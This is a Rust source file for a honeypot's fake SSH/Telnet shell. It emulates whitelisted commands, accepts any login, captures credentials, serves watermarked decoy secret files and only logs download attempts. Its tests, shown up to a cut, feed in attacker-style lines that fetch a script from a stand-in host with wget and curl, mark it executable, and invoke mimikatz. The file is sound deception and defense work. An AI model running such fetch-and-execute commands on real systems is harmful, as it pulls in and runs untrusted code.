//! 假 Shell 命令仿真层（0.5.9 H103）+ SSH 传输接线（0.5.9 H104）：
//! 白名单制命令响应 + 静态假文件系统视图 + russh(ring 后端)会话驱动。
//!
//! 设计约束（ROADMAP H100 红线）：
//! - **白名单而非黑名单**：未列出的命令一律 `bash: <cmd>: command not found`，
//!   错误文案对齐真实 bash，不泄漏「我是蜜罐」特征；
//! - 攻击者输入永远当「数据」：清洗、截断、只仿真组合命令的首个命令，
//!   永不拼接进任何系统调用，永不 fork 真实进程；
//! - `wget/curl` 只记录 URL 与参数，默认不真正发起下载，回显模拟成功以延续会话；
//! - 会话限制：命令数达上限即优雅退出（断连风格对齐 OpenSSH 正常断连）；
//! - SSH 口令不落日志/事件（H200 凭证库上线后以加盐哈希统一入库）。

use std::path::Path;
use std::sync::Arc;
use std::time::Duration;

use aisafeguard_core::config::ShellConfig;
use aisafeguard_core::event::ShellStep;
use russh::keys::{Algorithm, PrivateKey};
use russh::server::{Auth, ChannelOpenHandle, Handler, Msg, Session};
use russh::{Channel, ChannelId, Pty};
use tokio::sync::Mutex;

use crate::{SessionOutcome, sanitize};

/// 单条命令输入的截断上限（负路径：≥4KB 输入不 panic、有界留存）
const MAX_CMD_CHARS: usize = 4096;

/// 交互会话空闲超时：超时由 russh 断开，防自动化脚本无限挂会话
const SHELL_IDLE_TIMEOUT: Duration = Duration::from_secs(120);

// ---------- 运行时装配（H104） ----------

/// 假 Shell 运行时状态（start 时装配一次）。
#[derive(Clone)]
pub(crate) struct ShellRuntime {
    /// ssh 假 Shell 传输层;None = host key 不可用,ssh 保持 banner 模式
    pub ssh_config: Option<Arc<russh::server::Config>>,
    pub username: String,
    pub hostname: String,
    pub max_commands: usize,
    /// Telnet 假 Shell 独立开关（0.5.9 H120）
    pub telnet_enabled: bool,
}

/// 按配置装配假 Shell 运行时：host key 惰性加载/生成并持久化。
/// host key 失败时：仅 ssh 降级为 banner 模式（ssh_config=None），
/// telnet_enabled 时整体仍可用；两者都不可用才返回 Err。
pub(crate) fn start_runtime(
    shell: &ShellConfig,
    data_dir: &Path,
) -> std::io::Result<Arc<ShellRuntime>> {
    let key_path = if shell.host_key_path.is_empty() {
        data_dir.join("honeypot").join("hostkey.ed25519")
    } else {
        Path::new(&shell.host_key_path).to_path_buf()
    };
    let ssh_config = match load_or_generate_host_key(&key_path) {
        Ok(key) => Some(Arc::new(russh::server::Config {
            inactivity_timeout: Some(SHELL_IDLE_TIMEOUT),
            auth_rejection_time: Duration::from_secs(1),
            keys: vec![key],
            ..Default::default()
        })),
        Err(e) => {
            if shell.telnet_enabled {
                // telnet 不依赖 host key,仅 ssh 降级,留警告不断服务
                tracing::warn!("假 Shell host key 初始化失败(仅降级 ssh): {e}");
                None
            } else {
                return Err(e);
            }
        }
    };
    Ok(Arc::new(ShellRuntime {
        ssh_config,
        username: shell.username.clone(),
        hostname: shell.hostname.clone(),
        max_commands: shell.max_commands,
        telnet_enabled: shell.telnet_enabled,
    }))
}

/// host key 持久化（fed 证书路径模式）：存在则加载，缺失则生成 Ed25519 并落盘。
/// Unix 上文件权限 0600——host key 泄漏等于蜜罐指纹被固定伪造。
fn load_or_generate_host_key(path: &Path) -> std::io::Result<PrivateKey> {
    match std::fs::read_to_string(path) {
        Ok(pem) => PrivateKey::from_openssh(pem.trim()).map_err(|e| {
            std::io::Error::new(
                std::io::ErrorKind::InvalidData,
                format!("{} 解析失败: {e}", path.display()),
            )
        }),
        Err(e) if e.kind() == std::io::ErrorKind::NotFound => {
            let key = PrivateKey::random(&mut rand::rng(), Algorithm::Ed25519)
                .map_err(|e| std::io::Error::other(format!("host key 生成失败: {e}")))?;
            let pem = key
                .to_openssh(Default::default())
                .map_err(|e| std::io::Error::other(format!("host key 序列化失败: {e}")))?;
            if let Some(parent) = path.parent() {
                std::fs::create_dir_all(parent)?;
            }
            #[cfg(unix)]
            {
                use std::io::Write;
                use std::os::unix::fs::OpenOptionsExt;
                let mut f = std::fs::OpenOptions::new()
                    .write(true)
                    .create_new(true)
                    .mode(0o600)
                    .open(path)?;
                f.write_all(pem.as_bytes())?;
            }
            #[cfg(not(unix))]
            std::fs::write(path, pem.as_bytes())?;
            Ok(key)
        }
        Err(e) => Err(e),
    }
}

// ---------- russh 会话驱动（H104，行为与 H103 paramiko 实连验证一致） ----------

/// 跨 run_stream 生命周期共享的会话状态：handler 被 russh 消费，
/// 逐命令记录经此交还会话出口。
struct ShellShared {
    rt: Arc<ShellRuntime>,
    session: Mutex<ShellSession>,
    line: Mutex<String>,
    auth_user: Mutex<String>,
    /// 认证口令（0.5.10 H200）：只在此暂存，会话出口哈希后即丢
    auth_pw: Mutex<String>,
}

/// 在已 accept 的 TCP 流上驱动一次 SSH 假 Shell 会话。
/// 任何 russh 错误都折算成事件摘要——蜜罐自身不因攻击输入挂掉。
pub(crate) async fn ssh_shell_session(
    stream: tokio::net::TcpStream,
    rt: Arc<ShellRuntime>,
    canary: Option<&crate::canary::CanaryState>,
) -> SessionOutcome {
    let shared = Arc::new(ShellShared {
        session: Mutex::new(
            ShellSession::new(rt.username.clone(), rt.hostname.clone(), rt.max_commands)
                .with_decoys(ShellSession::build_decoys(canary, &rt.username)),
        ),
        line: Mutex::new(String::new()),
        auth_user: Mutex::new(String::new()),
        auth_pw: Mutex::new(String::new()),
        rt,
    });
    let handler = SshShellHandler {
        shared: shared.clone(),
    };
    let Some(ssh_config) = shared.rt.ssh_config.clone() else {
        return empty_session_outcome("ssh 假 Shell 传输层不可用");
    };
    // run_stream().await 只等到 SSH-ID 交换并 spawn 会话任务;必须再 await
    // RunningSession 等会话真正结束,否则读到的是空状态(0.5.9 WSL 实测踩坑)
    let running = match russh::server::run_stream(ssh_config, stream, handler).await {
        Ok(r) => r,
        Err(e) => {
            // SSH-ID 阶段就失败(扫描器乱字节等常态):记录不报错
            tracing::debug!("ssh 假 Shell 握手失败: {e}");
            return empty_session_outcome("SSH 握手未完成认证");
        }
    };
    if let Err(e) = running.await {
        tracing::debug!("ssh 假 Shell 会话结束: {e}");
    }
    let session = shared.session.lock().await;
    let steps = session.steps();
    // 凭证采集（H200）：认证过的 用户名/口令 对出会话前统一收集，handle_conn 哈希
    let auth_user = shared.auth_user.lock().await.clone();
    let credentials = if auth_user.is_empty() {
        Vec::new()
    } else {
        let auth_pw = shared.auth_pw.lock().await.clone();
        vec![crate::cred::RawCredential {
            username: auth_user.clone(),
            password: Some(auth_pw),
        }]
    };
    if steps.is_empty() {
        let summary = if auth_user.is_empty() {
            "SSH 握手未完成认证".to_string()
        } else {
            format!("SSH 口令认证通过,未进入 Shell(用户 {auth_user})")
        };
        SessionOutcome {
            summary,
            payload: String::new(),
            http_hint: None,
            interaction: None,
            credentials,
        }
    } else {
        let payload = steps
            .iter()
            .map(|s| s.command.as_str())
            .collect::<Vec<_>>()
            .join("\n");
        SessionOutcome {
            summary: format!("SSH 假 Shell 会话({} 条命令)", steps.len()),
            payload,
            http_hint: None,
            interaction: Some(steps.to_vec()),
            credentials,
        }
    }
}

struct SshShellHandler {
    shared: Arc<ShellShared>,
}

// ---------- Telnet 假 Shell（0.5.9 H120,复用命令仿真层） ----------

/// 剥离 Telnet IAC 转义序列(纯函数,fuzz 护栏对象):
/// IAC IAC=字面 0xFF;WILL/WONT/DO/DONT 带一个选项字节;SB..SE 子协商整段丢弃;
/// 其余 IAC+命令为两字节。截断的 IAC 尾巴直接丢弃。
pub(crate) fn strip_iac(bytes: &[u8]) -> Vec<u8> {
    let mut out = Vec::with_capacity(bytes.len());
    let mut i = 0usize;
    while i < bytes.len() {
        let b = bytes[i];
        if b != 0xff {
            out.push(b);
            i += 1;
            continue;
        }
        match bytes.get(i + 1) {
            None => break,
            Some(0xff) => {
                out.push(0xff);
                i += 2;
            }
            Some(250) => {
                // SB:丢弃到 IAC SE
                let end = bytes[i + 2..]
                    .windows(2)
                    .position(|w| w == [0xff, 0xf0])
                    .map(|p| i + 2 + p + 2);
                match end {
                    Some(next) => i = next,
                    None => break,
                }
            }
            Some(cmd) if (251..=254).contains(cmd) => i += 3,
            Some(_) => i += 2,
        }
    }
    out
}

/// Telnet 假 Shell 会话:login/password(口令不落留痕)→ 复用 [`ShellSession`]
/// 逐命令仿真。行模式;IAC 序列已剥离。
pub(crate) async fn telnet_shell_session(
    mut stream: tokio::net::TcpStream,
    rt: Arc<ShellRuntime>,
    canary: Option<&crate::canary::CanaryState>,
) -> SessionOutcome {
    use tokio::io::{AsyncReadExt, AsyncWriteExt};
    let mut shell = ShellSession::new(rt.username.clone(), rt.hostname.clone(), rt.max_commands)
        .with_decoys(ShellSession::build_decoys(canary, &rt.username));
    let mut line_buf: Vec<u8> = Vec::new();
    let mut raw = vec![0u8; 2048];

    // 读一行(IAC 已剥离;\r / \n / \r\n 均为行结束)
    async fn read_line(
        stream: &mut tokio::net::TcpStream,
        line_buf: &mut Vec<u8>,
        raw: &mut [u8],
    ) -> std::io::Result<Option<String>> {
        loop {
            if let Some(pos) = line_buf.iter().position(|&b| b == b'\r' || b == b'\n') {
                let line: Vec<u8> = line_buf.drain(..pos).collect();
                line_buf.remove(0);
                // \r\n 双字节结束:吃掉紧跟的另一半
                if line_buf.first() == Some(&b'\n') || line_buf.first() == Some(&b'\r') {
                    line_buf.remove(0);
                }
                return Ok(Some(sanitize(&line, MAX_CMD_CHARS)));
            }
            if line_buf.len() > MAX_CMD_CHARS {
                let line: Vec<u8> = line_buf.drain(..MAX_CMD_CHARS).collect();
                return Ok(Some(sanitize(&line, MAX_CMD_CHARS)));
            }
            let n = tokio::time::timeout(crate::READ_TIMEOUT, stream.read(raw)).await??;
            if n == 0 {
                return Ok(None);
            }
            line_buf.extend_from_slice(&strip_iac(&raw[..n]));
        }
    }

    macro_rules! reply {
        ($text:expr) => {
            // 写失败 = 对端已断:留给读循环收尾
            let _ = stream
                .write_all($text.replace('\n', "\r\n").as_bytes())
                .await;
        };
    }

    // 登录流程(banner 文案对齐 banner 模式)
    reply!(format!(
        "Welcome to Ubuntu 22.04 LTS\r\n{} login: ",
        rt.hostname
    ));
    let username = match read_line(&mut stream, &mut line_buf, &mut raw).await {
        Ok(Some(u)) if !u.is_empty() => u,
        _ => return empty_session_outcome("Telnet 连接未完成登录"),
    };
    reply!("Password: ");
    // read_line 的 Result/Option 折叠成 Option：连接中断=没拿到口令
    let password = read_line(&mut stream, &mut line_buf, &mut raw)
        .await
        .ok()
        .flatten();
    // 口令不落任何留痕(H200 接管采集:进凭证对,handle_conn 哈希);任意凭证放行
    reply!(format!(
        "\r\nWelcome to Ubuntu 22.04 LTS (GNU/Linux 6.1.0-18-amd64 x86_64)\r\n\r\n{}",
        shell.prompt()
    ));

    loop {
        let line = match read_line(&mut stream, &mut line_buf, &mut raw).await {
            Ok(Some(l)) => l,
            _ => break,
        };
        match shell.handle_line(&line) {
            ShellAction::Reply(text) => {
                if !text.is_empty() {
                    reply!(text);
                }
                reply!("\r\n");
                reply!(shell.prompt());
            }
            ShellAction::Exit => {
                reply!("logout\r\n");
                break;
            }
        }
    }

    let steps = shell.steps();
    let summary = if steps.is_empty() {
        format!("Telnet 认证通过(用户 {username}),未发送命令")
    } else {
        format!("Telnet 假 Shell 会话({} 条,用户 {username})", steps.len())
    };
    let payload = steps
        .iter()
        .map(|s| s.command.as_str())
        .collect::<Vec<_>>()
        .join("\n");
    SessionOutcome {
        summary,
        payload,
        http_hint: None,
        interaction: if steps.is_empty() {
            None
        } else {
            Some(steps.to_vec())
        },
        credentials: vec![crate::cred::RawCredential { username, password }],
    }
}

fn empty_session_outcome(summary: &str) -> SessionOutcome {
    SessionOutcome {
        summary: summary.to_string(),
        payload: String::new(),
        http_hint: None,
        interaction: None,
        credentials: Vec::new(),
    }
}

impl Handler for SshShellHandler {
    type Error = russh::Error;

    async fn auth_password(&mut self, user: &str, password: &str) -> Result<Auth, Self::Error> {
        // 任意凭证放行是蜜罐前提;口令明文/长度都不落任何留痕(H200 接管采集:
        // 暂存到 shared,会话出口统一哈希)
        *self.shared.auth_user.lock().await = user.to_string();
        *self.shared.auth_pw.lock().await = password.to_string();
        Ok(Auth::Accept)
    }

    async fn channel_open_session(
        &mut self,
        _channel: Channel<Msg>,
        reply: ChannelOpenHandle,
        _session: &mut Session,
    ) -> Result<(), Self::Error> {
        reply.accept().await;
        Ok(())
    }

    async fn pty_request(
        &mut self,
        channel: ChannelId,
        _term: &str,
        _col: u32,
        _row: u32,
        _pix_w: u32,
        _pix_h: u32,
        _modes: &[(Pty, u32)],
        session: &mut Session,
    ) -> Result<(), Self::Error> {
        session.channel_success(channel)?;
        Ok(())
    }

    async fn shell_request(
        &mut self,
        channel: ChannelId,
        session: &mut Session,
    ) -> Result<(), Self::Error> {
        session.channel_success(channel)?;
        let prompt = self.shared.session.lock().await.prompt();
        session.data(channel, format!("\r\n{prompt}").into_bytes())?;
        Ok(())
    }

    async fn exec_request(
        &mut self,
        channel: ChannelId,
        data: &[u8],
        session: &mut Session,
    ) -> Result<(), Self::Error> {
        // 非交互式单命令(ssh user@host "cmd")：同样走白名单仿真
        session.channel_success(channel)?;
        let cmd = String::from_utf8_lossy(data).to_string();
        let action = self.shared.session.lock().await.handle_line(&cmd);
        if let ShellAction::Reply(text) = action
            && !text.is_empty()
        {
            session.data(channel, format!("{text}\n").into_bytes())?;
        }
        session.eof(channel)?;
        session.close(channel)?;
        Ok(())
    }

    async fn data(
        &mut self,
        channel: ChannelId,
        data: &[u8],
        session: &mut Session,
    ) -> Result<(), Self::Error> {
        // PTY 行组装：回显可见字符,退格删字符,\r 提交行进仿真层
        let mut line = self.shared.line.lock().await;
        for &b in data {
            match b {
                b'\r' | b'\n' => {
                    session.data(channel, b"\r\n".to_vec())?;
                    let committed = std::mem::take(&mut *line);
                    drop(line);
                    let action = self.shared.session.lock().await.handle_line(&committed);
                    let close = match action {
                        ShellAction::Reply(text) => {
                            if !text.is_empty() {
                                session.data(channel, text.replace('\n', "\r\n").into_bytes())?;
                            }
                            session.data(channel, b"\r\n".to_vec())?;
                            false
                        }
                        ShellAction::Exit => true,
                    };
                    if close {
                        session.data(channel, b"logout\r\n".to_vec())?;
                        session.eof(channel)?;
                        return Err(russh::Error::Disconnect);
                    }
                    let prompt = self.shared.session.lock().await.prompt();
                    session.data(channel, prompt.into_bytes())?;
                    line = self.shared.line.lock().await;
                }
                0x7f | 0x08 => {
                    if line.pop().is_some() {
                        session.data(channel, b"\x08 \x08".to_vec())?;
                    }
                }
                0x03 => {
                    // Ctrl+C：丢弃当前行,出新 prompt
                    line.clear();
                    session.data(channel, b"^C\r\n".to_vec())?;
                    let prompt = self.shared.session.lock().await.prompt();
                    session.data(channel, prompt.into_bytes())?;
                }
                0x20..=0x7e | b'\t' => {
                    line.push(b as char);
                    session.data(channel, vec![b])?;
                }
                _ => {}
            }
        }
        Ok(())
    }
}

/// 会话内一行输入的处理结果
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum ShellAction {
    /// 回显文本（不含结尾 prompt；空串 = 仅出新 prompt，对齐真实命令的静默成功）
    Reply(String),
    /// exit / 命令数达上限：优雅断开
    Exit,
}

/// 一次假 Shell 会话：维护历史与逐命令记录，输出事件层的 [`ShellStep`] 数组。
pub struct ShellSession {
    user: String,
    host: String,
    max_commands: usize,
    history: Vec<String>,
    steps: Vec<ShellStep>,
    /// 蜜饵文件（Honeybits，F794b③）：路径 → 带水印内容的合成文件，cat 先查此表
    decoys: std::collections::HashMap<String, String>,
}

impl ShellSession {
    pub fn new(user: impl Into<String>, host: impl Into<String>, max_commands: usize) -> Self {
        Self {
            user: user.into(),
            host: host.into(),
            max_commands,
            history: Vec::new(),
            steps: Vec::new(),
            decoys: std::collections::HashMap::new(),
        }
    }

    /// 挂载蜜饵文件（Honeybits，F794b③）：canary 水印内嵌敏感值形态的合成数据，
    /// .bash_history 充当面包屑引导攻击者走向蜜饵文件。
    pub fn with_decoys(mut self, decoys: Vec<(String, String)>) -> Self {
        self.decoys = decoys.into_iter().collect();
        self
    }

    /// 构造蜜饵文件表：canary 可用时敏感值内嵌水印（外泄使用即归因），
    /// 无 canary 时用固定显式合成值（红线：不得被当真实数据引用）。
    pub(crate) fn build_decoys(
        canary: Option<&crate::canary::CanaryState>,
        user: &str,
    ) -> Vec<(String, String)> {
        let (app_key, db_pass, api_key) = match canary.and_then(|c| c.token("shell/env")) {
            Some(t) => (format!("base64:{t}"), t.clone(), t.clone()),
            None => (
                "base64:SYNTHETIC-DECOY".into(),
                "SYNTHETIC-DECOY".into(),
                "SYNTHETIC-DECOY".into(),
            ),
        };
        let env_path = format!("/home/{user}/.env");
        let hist_path = format!("/home/{user}/.bash_history");
        let cfg_path = format!("/home/{user}/app/config.yml");
        vec![
            (
                env_path.clone(),
                format!(
                    "APP_KEY={app_key}\nDB_PASSWORD={db_pass}\nREDIS_URL=redis://:{db_pass}@127.0.0.1:6379\n"
                ),
            ),
            (
                cfg_path.clone(),
                format!(
                    "database:\n  host: db-internal.prod\n  password: \"{db_pass}\"\napi:\n  key: {api_key}\n"
                ),
            ),
            (
                hist_path,
                format!(
                    "cat /home/{user}/.env\ncd app && ./deploy.sh restart\nmysql -h db-internal.prod -u svc_app -p\nscp backup.tgz deploy@backup-internal:/srv/\ncat {cfg_path}\n"
                ),
            ),
            (
                format!("/home/{user}/notes.txt"),
                "deployment notes (synthetic decoy content)\n".to_string(),
            ),
        ]
    }

    /// 假 prompt：`user@host:~$ `（用户名/主机名可配，模板参数化归 0.5.11 H300）
    pub fn prompt(&self) -> String {
        format!("{}@{}:~$ ", self.user, self.host)
    }

    /// 本会话逐命令记录（事件 interaction 字段的直接来源）
    pub fn steps(&self) -> &[ShellStep] {
        &self.steps
    }

    pub fn history(&self) -> &[String] {
        &self.history
    }

    /// 处理一行攻击者输入：清洗 → 截断 → 只仿真首个命令 → 记录 ShellStep。
    /// 任何输入都不 panic（负路径由模糊测试守护）。
    pub fn handle_line(&mut self, raw: &str) -> ShellAction {
        if self.history.len() >= self.max_commands {
            return ShellAction::Exit;
        }
        let line = sanitize(raw.as_bytes(), MAX_CMD_CHARS);
        let line = line.trim();
        if line.is_empty() {
            // 空行对齐真实 bash：不出历史、不进记录，仅出新 prompt
            return ShellAction::Reply(String::new());
        }

        let first = segment_before_combinator(line);
        let (response, exit) = self.simulate(first);
        self.history.push(line.to_string());
        self.steps.push(ShellStep {
            command: line.to_string(),
            response: response.clone(),
        });
        if exit {
            ShellAction::Exit
        } else {
            ShellAction::Reply(response)
        }
    }

    /// 仿真单个命令（组合命令只解析首个，其余原样记录在 step.command）。
    fn simulate(&self, cmd: &str) -> (String, bool) {
        let mut parts = cmd.split_whitespace();
        let Some(program) = parts.next() else {
            return (
                "bash: syntax error near unexpected token `;'".to_string(),
                false,
            );
        };
        let args: Vec<&str> = parts.collect();
        match program {
            "exit" | "logout" => (String::new(), true),
            "whoami" => (self.user.clone(), false),
            "id" => (
                format!(
                    "uid=1000({u}) gid=1000({u}) groups=1000({u}),27(sudo),33(www-data)",
                    u = self.user
                ),
                false,
            ),
            "uname" => (self.uname(&args), false),
            "pwd" => (format!("/home/{}", self.user), false),
            "ls" => (self.ls(&args), false),
            "cat" => (self.cat(&args), false),
            "ps" => (ps_snapshot().to_string(), false),
            "ifconfig" => (ifconfig_snapshot().to_string(), false),
            "ip" if args.first().is_some_and(|a| *a == "addr") => {
                (ip_addr_snapshot().to_string(), false)
            }
            "netstat" => (netstat_snapshot().to_string(), false),
            "wget" | "curl" => (self.download(program, &args), false),
            "chmod" => (String::new(), false),
            "history" => (self.history_reply(), false),
            other => (format!("bash: {other}: command not found"), false),
        }
    }

    fn uname(&self, args: &[&str]) -> String {
        if args.contains(&"-a") {
            format!(
                "Linux {host} 6.1.0-18-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.76-1 (2024-02-01) x86_64 GNU/Linux",
                host = self.host
            )
        } else if args.contains(&"-r") {
            "6.1.0-18-amd64".to_string()
        } else {
            "Linux".to_string()
        }
    }

    fn ls(&self, args: &[&str]) -> String {
        // ls 的参数里取第一个非 - 开头的词作路径；无路径 = 当前目录（~ = /home/<user>）
        let home = format!("/home/{}", self.user);
        let path: String = args
            .iter()
            .find(|a| !a.starts_with('-'))
            .map(|s| s.to_string())
            .unwrap_or_else(|| home.clone());
        let listing: Option<Vec<String>> = if path == home {
            Some(vec![
                ".bash_history".into(),
                ".env".into(),
                ".profile".into(),
                ".ssh".into(),
                "app".into(),
                "logs".into(),
                "notes.txt".into(),
            ])
        } else if path == "/home" {
            Some(vec![self.user.clone()])
        } else {
            ls_listing(&path).map(|v| v.into_iter().map(String::from).collect())
        };
        match listing {
            Some(names) => names.join("  "),
            None => format!("ls: cannot access '{path}': No such file or directory"),
        }
    }

    fn cat(&self, args: &[&str]) -> String {
        let Some(path) = args.first().copied() else {
            // 真实 cat 无操作数时等待 stdin；行模式下以静默对应
            return String::new();
        };
        // F794b③：蜜饵文件优先（带水印的合成敏感文件——Honeybits 面包屑的落点）
        if let Some(content) = self.decoys.get(path) {
            return content.clone();
        }
        match cat_file(path, &self.host) {
            Some(content) => content.to_string(),
            None => format!("cat: {path}: No such file or directory"),
        }
    }

    /// wget/curl：只记录 URL 与参数，不发起真实下载；回显模拟成功延续会话。
    fn download(&self, program: &str, args: &[&str]) -> String {
        // 取第一个含 :// 的词为目标 URL；没有则按无 URL 参数处理
        let url = args
            .iter()
            .find(|a| a.contains("://"))
            .copied()
            .unwrap_or_default();
        if url.is_empty() {
            return format!("bash: {program}: command not found");
        }
        let host = url
            .split("://")
            .nth(1)
            .unwrap_or_default()
            .split(['/', ':'])
            .next()
            .unwrap_or_default()
            .to_string();
        let name = url.rsplit('/').next().unwrap_or("index.html").to_string();
        let name = if name.is_empty() {
            "index.html".to_string()
        } else {
            name
        };
        if program == "wget" {
            format!(
                "--2024-01-15 09:30:00--  {url}\nResolving {host}... 203.0.113.10\nConnecting to {host}|203.0.113.10|:80... connected.\nHTTP request sent, awaiting response... 200 OK\nLength: 1024 (1.0K) [text/plain]\nSaving to: '{name}'\n\n'{name}' saved [1024/1024]"
            )
        } else {
            "  % Total    % Received  % Xferd  Average Speed   Time    Time     Time  Current Time\n                                 Dload  Upload   Total   Spent    Left  Speed\n100  1024  100  1024      0      0   1024      0  0:00:01 --:--:--  0:00:01  1024"
                .to_string()
        }
    }

    fn history_reply(&self) -> String {
        self.history
            .iter()
            .enumerate()
            .map(|(i, cmd)| format!("{:>5}  {}", i + 1, cmd))
            .collect::<Vec<_>>()
            .join("\n")
    }
}

/// 组合命令只解析首个：在 `;` `|` `&` 处截断（引号内的 & 简化处理：截断只影响
/// 响应仿真，完整命令原样入记录）。
fn segment_before_combinator(line: &str) -> &str {
    match line.find([';', '|', '&']) {
        Some(i) => &line[..i],
        None => line,
    }
}

// ---------- 静态假文件系统（内置合成常量，零真实数据；H210 canary 预留接点） ----------

fn ls_listing(path: &str) -> Option<Vec<&'static str>> {
    match path {
        "/" => Some(vec![
            "bin", "boot", "dev", "etc", "home", "lib", "lib64", "media", "mnt", "opt", "proc",
            "root", "run", "sbin", "srv", "sys", "tmp", "usr", "var",
        ]),
        "/etc" => Some(vec![
            "hostname",
            "hosts",
            "os-release",
            "passwd",
            "shadow",
            "ssh",
            "systemd",
        ]),
        "/home" => Some(vec!["deploy"]),
        "/var" => Some(vec!["log", "www"]),
        "/var/www" => Some(vec!["html"]),
        _ => None,
    }
}

/// cat 的内置诱饵内容：结构与真实文件一致，数据全部合成（明显假/零值）。
fn cat_file(path: &str, host: &str) -> Option<String> {
    match path {
        "/etc/hostname" => Some(format!("{host}\n")),
        "/etc/passwd" => Some(
            concat!(
                "root:x:0:0:root:/root:/bin/bash\n",
                "daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n",
                "www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\n",
                "deploy:x:1000:1000:deploy:/home/deploy:/bin/bash\n",
            )
            .to_string(),
        ),
        "/etc/shadow" => Some(
            concat!(
                "root:*:19769:0:99999:7:::\n",
                "daemon:*:19769:0:99999:7:::\n",
                "deploy:$6$PLACEHOLDER$FAKEHASHNOTREAL:19769:0:99999:7:::\n",
            )
            .to_string(),
        ),
        "/etc/hosts" => Some(
            concat!(
                "127.0.0.1\tlocalhost\n",
                "127.0.1.1\tdebian-11\n",
                "::1\tip6-localhost\n",
            )
            .to_string(),
        ),
        "/etc/os-release" => Some(
            concat!(
                "PRETTY_NAME=\"Debian GNU/Linux 12 (bookworm)\"\n",
                "NAME=\"Debian GNU/Linux\"\n",
                "ID=debian\n",
            )
            .to_string(),
        ),
        _ => None,
    }
}

// ---------- 静态命令快照（合成常量；外网地址一律 TEST-NET 明显假值） ----------

fn ps_snapshot() -> &'static str {
    concat!(
        "USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND\n",
        "root         1  0.0  0.1 167776 11504 ?        Ss   09:00   0:02 /sbin/init\n",
        "root       412  0.0  0.2  28880 15432 ?        Ss   09:00   0:00 /usr/sbin/sshd -D\n",
        "www-data   902  0.1  0.5 123456 52224 ?        S    09:01   0:03 php-fpm: pool www\n",
        "deploy    1204  0.0  0.3  98760 30120 ?        S    09:02   0:01 python3 app/main.py\n",
    )
}

fn ifconfig_snapshot() -> &'static str {
    concat!(
        "eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500\n",
        "        inet 10.0.2.15  netmask 255.255.255.0  broadcast 10.0.2.255\n",
        "        ether 52:54:00:12:34:56  txqueuelen 1000  (Ethernet)\n",
        "lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536\n",
        "        inet 127.0.0.1  netmask 255.0.0.0\n",
    )
}

fn ip_addr_snapshot() -> &'static str {
    concat!(
        "1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 state UNKNOWN\n",
        "    inet 127.0.0.1/8 scope host lo\n",
        "2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 state UP\n",
        "    inet 10.0.2.15/24 brd 10.0.2.255 scope global eth0\n",
    )
}

fn netstat_snapshot() -> &'static str {
    concat!(
        "Active Internet connections (servers and established)\n",
        "Proto Recv-Q Send-Q Local Address           Foreign Address         State\n",
        "tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN\n",
        "tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN\n",
        "tcp        0      0 10.0.2.15:22            203.0.113.50:51234      ESTABLISHED\n",
    )
}

#[cfg(test)]
mod tests {
    use super::*;

    /// F794b③ 字节级断言（协作约定）：蜜饵 .env 的换行是真实 0x0A（源码内
    /// 0x5C 0x6E 转义在编译期解析），前缀字节与水印内嵌逐项核对。
    #[test]
    fn decoy_env_bytes_and_watermark() {
        let decoys = ShellSession::build_decoys(None, "deploy");
        let (_, env) = decoys
            .iter()
            .find(|(p, _)| p.ends_with("/.env"))
            .expect("应含 .env 蜜饵");
        assert_eq!(&env.as_bytes()[..8], b"APP_KEY=");
        assert!(env.as_bytes().contains(&0x0A), "换行应为已解析的 0x0A");
        assert!(
            !env.as_bytes().windows(2).any(|w| w == [0x5C, 0x6E]),
            "内容不得残留源码层转义序列（0x5C 0x6E）"
        );
        assert!(env.contains("DB_PASSWORD=SYNTHETIC-DECOY"));
        // bash_history 是 Honeybits 面包屑：引导到 .env 与 config.yml
        let (_, hist) = decoys
            .iter()
            .find(|(p, _)| p.ends_with("/.bash_history"))
            .expect("应含 .bash_history 蜜饵");
        assert!(hist.contains(".env") && hist.contains("config.yml"));
    }

    /// with_decoys 后 cat 蜜饵文件走水印内容，未挂载路径回落静态虚拟文件系统
    #[test]
    fn cat_hits_decoys_first() {
        let decoys = ShellSession::build_decoys(None, "deploy");
        let mut s = session().with_decoys(decoys);
        let env = s.handle_line("cat /home/deploy/.env").unwrap_reply();
        assert!(env.contains("SYNTHETIC-DECOY"), "实际: {env}");
        let passwd = s.handle_line("cat /etc/passwd").unwrap_reply();
        assert!(
            passwd.contains("deploy:x:1000"),
            "静态虚拟文件系统不受影响: {passwd}"
        );
    }

    fn session() -> ShellSession {
        ShellSession::new("deploy", "debian-11", 50)
    }

    #[test]
    fn whitelist_commands_respond() {
        let mut s = session();
        assert_eq!(s.prompt(), "deploy@debian-11:~$ ");
        assert_eq!(s.handle_line("whoami"), ShellAction::Reply("deploy".into()));
        assert!(
            s.handle_line("uname -a")
                .reply_contains("Linux debian-11 6.1.0-18-amd64")
        );
        assert_eq!(
            s.handle_line("pwd"),
            ShellAction::Reply("/home/deploy".into())
        );
        assert!(s.handle_line("id").reply_contains("uid=1000(deploy)"));
        assert!(s.handle_line("ls").reply_contains(".bash_history"));
        assert!(
            s.handle_line("cat /etc/passwd")
                .reply_contains("deploy:x:1000")
        );
        assert!(
            s.handle_line("cat /etc/hostname")
                .reply_contains("debian-11")
        );
        assert!(s.handle_line("ps aux").reply_contains("/usr/sbin/sshd"));
        assert!(s.handle_line("ifconfig").reply_contains("inet 10.0.2.15"));
        assert!(s.handle_line("ip addr").reply_contains("10.0.2.15/24"));
        assert!(
            s.handle_line("netstat -antup")
                .reply_contains("ESTABLISHED")
        );
        assert!(
            s.handle_line("wget http://203.0.113.10/x.sh")
                .reply_contains("saved")
        );
        assert!(
            s.handle_line("curl -sL http://203.0.113.10/x.sh")
                .reply_contains("100")
        );
        // chmod 静默成功（对齐真实 chmod）
        assert_eq!(
            s.handle_line("chmod +x x.sh"),
            ShellAction::Reply("".into())
        );
    }

    #[test]
    fn unknown_command_matches_bash_text() {
        let mut s = session();
        assert_eq!(
            s.handle_line("mimikatz"),
            ShellAction::Reply("bash: mimikatz: command not found".into())
        );
        // 不泄漏蜜罐特征：文案与真实 bash 一致，无多余提示
